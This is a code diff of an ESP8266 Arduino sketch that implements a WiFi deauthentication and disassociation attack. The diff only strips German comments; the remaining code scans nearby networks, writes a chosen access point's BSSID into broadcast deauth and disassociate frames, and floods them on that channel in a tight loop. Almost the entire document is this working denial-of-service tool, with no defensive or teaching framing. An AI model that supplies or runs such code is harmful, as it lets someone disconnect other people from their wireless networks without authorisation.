@@ -2,11 +2,9 @@
 
 extern "C" {
   #include "user_interface.h"
-  // Diese Zeile fehlte – sie deklariert die SDK-Funktion manuell:
   int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
 }
 
-// Das Paket-Template
 uint8_t packet[26] = {
     0xC0, 0x00, 0x3A, 0x01,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
@@ -19,7 +17,6 @@ uint8_t packet[26] = {
 void setup() {
   Serial.begin(115200);
   
-  // WICHTIG für SDK 2.0.0:
   WiFi.mode(WIFI_STA);
   wifi_set_opmode(STATION_MODE);
   wifi_promiscuous_enable(0); 
@@ -28,7 +25,6 @@ void setup() {
 }
 
 void loop() {
-  // Für den Scan brauchen wir den Standard-Modus
   wifi_promiscuous_enable(0);
   Serial.println("\nScanne...");
   int n = WiFi.scanNetworks();
@@ -52,11 +48,9 @@ void loop() {
     uint8_t* bssid = WiFi.BSSID(sel);
     int ch = WiFi.channel(sel);
 
-    // BSSID in Paket kopieren
     memcpy(&packet[10], bssid, 6);
     memcpy(&packet[16], bssid, 6);
 
-    // In Sende-Modus wechseln
     wifi_set_channel(ch);
     wifi_promiscuous_enable(1);
 
@@ -65,20 +59,16 @@ void loop() {
     uint16_t seq = 0;
 
     while (millis() < end) {
-      // Sequence Number Logik
       seq++;
       packet[22] = (seq << 4) & 0xFF;
       packet[23] = (seq >> 4) & 0xFF;
 
-      // 1. Deauth schicken
       packet[0] = 0xC0;
       wifi_send_pkt_freedom(packet, 26, 0);
 
-      // 2. Disassociate schicken (oft effektiver!)
       packet[0] = 0xA0;
       wifi_send_pkt_freedom(packet, 26, 0);
 
-      // Kurze Pause, damit der Chip nicht überhitzt
       delay(2); 
       yield();
     }
